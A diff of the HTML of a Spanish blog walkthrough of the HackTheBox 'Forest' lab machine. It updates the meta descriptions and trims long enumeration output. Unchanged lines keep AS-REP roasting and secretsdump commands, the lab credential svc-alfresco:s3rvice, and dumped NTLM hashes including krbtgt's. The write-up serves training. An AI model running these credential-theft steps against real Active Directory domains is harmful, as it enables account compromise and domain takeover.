@@ -1229,7 +1229,7 @@
 
 
     
-<meta name="description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español" />
+<meta name="description" content="Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador." />
 
 
 <meta name="keywords" content="enum4linux,kerberos,smbmap,impacket,evil-winrm,bloodhound,aclpwn">
@@ -1246,7 +1246,7 @@
 <meta property="og:title" content="Hack The Box - Forest">
 <meta property="og:url" content="https://sckull.github.io/posts/forest/">
 <meta property="og:type" content="article">
-<meta property="og:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
+<meta property="og:description" content="Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.">
 
   
     <meta property="og:image" content="https://sckull.github.io/images/posts/htb/forest/cover.webp">
@@ -1254,7 +1254,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="sckull">
     <meta property="twitter:title" content="Hack The Box - Forest">
-    <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
+    <meta property="twitter:description" content="Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.">
   
 
 <meta name="generator" content="Hugo 0.68.3" />
@@ -1284,7 +1284,7 @@
     "datePublished": "2020-01-10T00:00:00Z",
     "dateModified": "2020-01-10T00:00:00Z",
     "url" : "https://sckull.github.io/posts/forest/",
-    "description": "Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.",
+    "description": "Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.",
     "keywords": ["enum4linux","kerberos","smbmap","impacket","evil-winrm","bloodhound","aclpwn"],
     "image" : "https://sckull.github.io/images/posts/htb/forest/cover.webp",
     "author": {
@@ -1577,7 +1577,7 @@
 <div class="single__infos">
   <time class="single__info" title="Written At">📅&nbsp;Jan 10, 2020 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;16&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;14&nbsp;min read </span>
   
   &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">✍️&nbsp;sckull</span>
   
@@ -1616,8 +1616,7 @@
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <p>Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</p>
-
+      
 
 
 
@@ -1629,6 +1628,7 @@
     <img src="/images/posts/htb/forest/cover.webp" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
+<p>Forest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.</p>
 <h1 id="informacion-de-la-maquina">Informacion de la Maquina</h1>
 <table>
 <thead>
@@ -1953,116 +1953,86 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 
@@ -2115,17 +2085,7 @@ index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator	Name: Administrat
 index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy	Name: Andy Hislip	Desc: <span class="o">(</span>null<span class="o">)</span>
 index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: A user account managed by the system.
 index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for</span> guest access to the computer/domain
-index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1	Name: HealthMailbox-EXCH01-010	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e	Name: HealthMailbox-EXCH01-003	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678	Name: HealthMailbox-EXCH01-005	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e	Name: HealthMailbox-EXCH01-009	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781	Name: HealthMailbox-EXCH01-006	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d	Name: HealthMailbox-EXCH01-004	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64	Name: HealthMailbox-EXCH01-008	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9	Name: HealthMailbox-EXCH01-002	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722	Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad	Name: HealthMailbox-EXCH01-001	Desc: <span class="o">(</span>null<span class="o">)</span>
-index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238	Name: HealthMailbox-EXCH01-007	Desc: <span class="o">(</span>null<span class="o">)</span>
+<span class="o">[</span>... REDACTED ...<span class="o">]</span>
 index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
 index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda	Name: Lucinda Berger	Desc: <span class="o">(</span>null<span class="o">)</span>
 index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark	Name: Mark Brandt	Desc: <span class="o">(</span>null<span class="o">)</span>
@@ -2147,27 +2107,7 @@ user:<span class="o">[</span>Administrator<span class="o">]</span> rid:<span cla
 user:<span class="o">[</span>Guest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
 user:<span class="o">[</span>krbtgt<span class="o">]</span> rid:<span class="o">[</span>0x1f6<span class="o">]</span>
 user:<span class="o">[</span>DefaultAccount<span class="o">]</span> rid:<span class="o">[</span>0x1f7<span class="o">]</span>
-user:<span class="o">[</span><span class="nv">$331000</span>-VK4ADACQNUCA<span class="o">]</span> rid:<span class="o">[</span>0x463<span class="o">]</span>
-user:<span class="o">[</span>SM_2c8eef0a09b545acb<span class="o">]</span> rid:<span class="o">[</span>0x464<span class="o">]</span>
-user:<span class="o">[</span>SM_ca8c2ed5bdab4dc9b<span class="o">]</span> rid:<span class="o">[</span>0x465<span class="o">]</span>
-user:<span class="o">[</span>SM_75a538d3025e4db9a<span class="o">]</span> rid:<span class="o">[</span>0x466<span class="o">]</span>
-user:<span class="o">[</span>SM_681f53d4942840e18<span class="o">]</span> rid:<span class="o">[</span>0x467<span class="o">]</span>
-user:<span class="o">[</span>SM_1b41c9286325456bb<span class="o">]</span> rid:<span class="o">[</span>0x468<span class="o">]</span>
-user:<span class="o">[</span>SM_9b69f1b9d2cc45549<span class="o">]</span> rid:<span class="o">[</span>0x469<span class="o">]</span>
-user:<span class="o">[</span>SM_7c96b981967141ebb<span class="o">]</span> rid:<span class="o">[</span>0x46a<span class="o">]</span>
-user:<span class="o">[</span>SM_c75ee099d0a64c91b<span class="o">]</span> rid:<span class="o">[</span>0x46b<span class="o">]</span>
-user:<span class="o">[</span>SM_1ffab36a2f5f479cb<span class="o">]</span> rid:<span class="o">[</span>0x46c<span class="o">]</span>
-user:<span class="o">[</span>HealthMailboxc3d7722<span class="o">]</span> rid:<span class="o">[</span>0x46e<span class="o">]</span>
-user:<span class="o">[</span>HealthMailboxfc9daad<span class="o">]</span> rid:<span class="o">[</span>0x46f<span class="o">]</span>
-user:<span class="o">[</span>HealthMailboxc0a90c9<span class="o">]</span> rid:<span class="o">[</span>0x470<span class="o">]</span>
-user:<span class="o">[</span>HealthMailbox670628e<span class="o">]</span> rid:<span class="o">[</span>0x471<span class="o">]</span>
-user:<span class="o">[</span>HealthMailbox968e74d<span class="o">]</span> rid:<span class="o">[</span>0x472<span class="o">]</span>
-user:<span class="o">[</span>HealthMailbox6ded678<span class="o">]</span> rid:<span class="o">[</span>0x473<span class="o">]</span>
-user:<span class="o">[</span>HealthMailbox83d6781<span class="o">]</span> rid:<span class="o">[</span>0x474<span class="o">]</span>
-user:<span class="o">[</span>HealthMailboxfd87238<span class="o">]</span> rid:<span class="o">[</span>0x475<span class="o">]</span>
-user:<span class="o">[</span>HealthMailboxb01ac64<span class="o">]</span> rid:<span class="o">[</span>0x476<span class="o">]</span>
-user:<span class="o">[</span>HealthMailbox7108a4e<span class="o">]</span> rid:<span class="o">[</span>0x477<span class="o">]</span>
-user:<span class="o">[</span>HealthMailbox0659cc1<span class="o">]</span> rid:<span class="o">[</span>0x478<span class="o">]</span>
+<span class="o">[</span>... REDACTED ...<span class="o">]</span>
 user:<span class="o">[</span>sebastien<span class="o">]</span> rid:<span class="o">[</span>0x479<span class="o">]</span>
 user:<span class="o">[</span>lucinda<span class="o">]</span> rid:<span class="o">[</span>0x47a<span class="o">]</span>
 user:<span class="o">[</span>svc-alfresco<span class="o">]</span> rid:<span class="o">[</span>0x47b<span class="o">]</span>
@@ -2263,27 +2203,6 @@ santi
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161
@@ -2292,33 +2211,12 @@ Impacket v0.9.19 - Copyright <span class="m">2019</span> SecureAuth Corporation
 <span class="o">[</span>-<span class="o">]</span> User Administrator doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
 </span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 </span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-</span><span class="s1">[-] User HealthMailboxc3d7722 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User HealthMailboxfc9daad doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User HealthMailboxc0a90c9 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User HealthMailbox670628e doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User HealthMailbox968e74d doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User HealthMailbox6ded678 doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User HealthMailbox83d6781 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User HealthMailboxfd87238 doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User HealthMailboxb01ac64 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User HealthMailbox7108a4e doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User HealthMailbox0659cc1 doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User sebastien doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User lucinda doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User andy doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
-</span><span class="s1">[-] User mark doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-<span class="o">[</span>-<span class="o">]</span> User santi doesn<span class="err">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span><span class="s1">[... REDACTED ...]
+</span><span class="s1">[-] User sebastien doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-<span class="o">]</span> User lucinda doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span class="s1">[-] User andy doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-<span class="o">]</span> User mark doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span><span class="s1">[-] User santi doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.</p>
@@ -2454,10 +2352,12 @@ Stopped: Fri Nov  <span class="m">1</span> 02:46:07 <span class="m">2019</span>
 <p><img src="/images/posts/htb/forest/Screenshot_20191105_001300.webp" alt="image" /></p>
 <p>Confirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.</p>
 <p><img src="/images/posts/htb/forest/Screenshot_20191105_002021.webp" alt="image" /></p>
-<h1 id="user-svc-alfresco">User svc-alfresco</h1>
-<p>En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVILRM.</p>
-<p>Evil-RM: <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
-<p>Install: <code>gem install evil-winrm</code></p>
+<h1 id="user---svc-alfresco">User - SVC-ALFRESCO</h1>
+<p>En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVIL-WinRM.</p>
+<ul>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></li>
+</ul>
+<p><strong>Install:</strong> <code>gem install evil-winrm</code></p>
 <p><img src="/images/posts/htb/forest/Screenshot_20191105_000802.webp" alt="image" /></p>
 <h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
 <p>Utilizamos <code>bloodhound.py</code> para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.</p>
@@ -2554,107 +2454,55 @@ Please choose a path [0-1] 1
 <p>Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
@@ -2667,27 +2515,7 @@ htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b514
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\$</span>331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
